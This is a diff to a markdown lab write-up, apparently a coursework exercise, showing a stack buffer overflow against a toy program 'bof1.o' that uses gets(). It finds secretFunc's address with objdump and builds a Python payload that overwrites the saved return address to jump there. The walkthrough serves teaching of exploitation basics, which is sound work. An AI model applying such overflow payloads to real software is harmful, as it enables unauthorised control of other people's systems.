@@ -56,17 +56,19 @@ This is because the source code used `gets()` which is a vulnerable function. It
 
 In order to call the function `secretFunc()`, we need to know its address. We can obtain this address using `objdump`.
 
-    objdump -d bof1.o | grep secretFunc
+```bash
+objdump -d bof1.o | grep secretFunc
+```
 
 ![objdump -d bof1.o | grep secretFunc](./img/bof1/objdump.png)
 
-The address of the function is `0x0804846b`. When writing this address to the stack, we need to represent it in Little Endian format, meaning it is reversed in memory (`6b 84 04 08`)
+The address of the function is `0x0804846b`. When writing this address to the stack, we need to represent it in **Little Endian** format, meaning it is reversed in memory (`6b 84 04 08`)
 
 ## Attack
 
 We will overflow the stack frame of the `vuln()` function, specifically the local `array` variable. The goal is to overwrite the saved return address (`eip`) on the stack, causing it to jump to `secretFunc()`.
 
-Stack frame of `vuln()`:
+### Stack frame of `vuln()`:
 
 ![vuln()](./img/bof1/stackframe.png)
 
@@ -78,19 +80,23 @@ The input should be 200 bytes to fill the memory spared for the `array` local va
 
 Since the input is so long, I will use Python to do it for me
 
-    echo $(python -c "print('a' * 200 + 'b' * 4 + '\x6b\x84\x04\x08')")
+```bash
+echo $(python -c "print('a' * 200 + 'b' * 4 + '\x6b\x84\x04\x08')")
+```
 
-Explain:
+### Explain:
 
 -   `'a' * 200`: 200 characters for the `array`.
 -   `'b' * 4`: 4 characters for the `ebp`.
--   `'\x6b\x84\x04\x08'`: address of `secretFunc()` written in Little Endian format.
+-   `'\x6b\x84\x04\x08'`: address of `secretFunc()` written in **Little Endian** format.
 
-To pipe the output of the `echo` into the input of the program, we will add `| ./bof1.o 1` after the `echo`:
+To inject the output of the `echo` into the input of the program, we will add `| ./bof1.o 1` after the `echo`:
 
-    echo $(python -c "print('a' * 200 + 'b' * 4 + '\x6b\x84\x04\x08')") | ./bof1.o 1
+```bash
+echo $(python -c "print('a' * 200 + 'b' * 4 + '\x6b\x84\x04\x08')") | ./bof1.o 1
+```
 
-Result:
+### Result:
 
 ![result](./img/bof1/result.png)
 
